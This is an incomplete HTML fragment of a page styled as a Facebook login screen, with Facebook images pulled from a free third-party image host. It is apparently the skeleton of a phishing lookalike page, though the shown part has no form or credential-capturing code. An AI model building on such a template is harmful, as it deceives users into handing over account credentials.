...
<html lang="en">
  <head>
    ...
    <link rel="shorcut icon" href="https://i.ibb.co/S3LB1MY/fb.png">
  ...
  <body>
    <div class="login mx-auto d-block">
      <nav class="navbar bg-utama navbar-dark text-center">
        <div class="container">
          <img class="mx-auto d-block img-login" src="https://i.ibb.co/Pcb84t1/fb-login.png">
        </div>
      </nav>
      ...
      <div class="container">
        <div class="row">
          <div class="col-sm-12 col-lg-12 text-center mx-auto d-block">
            <img class="img-icon mt-4 mb-4" src="logo.png">
            <div class="text">
